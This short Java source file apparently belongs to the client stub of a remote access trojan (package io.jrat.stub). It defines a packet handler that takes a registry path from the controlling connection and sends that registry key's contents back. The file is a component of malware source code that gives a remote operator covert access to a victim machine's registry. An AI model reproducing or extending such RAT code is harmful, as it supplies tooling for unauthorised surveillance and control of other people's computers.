package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.packets.outgoing.Packet54Registry;

public class Packet79BrowseRegistry extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String path = con.readLine();

		con.addToSendQueue(new Packet54Registry(path));
	}

}
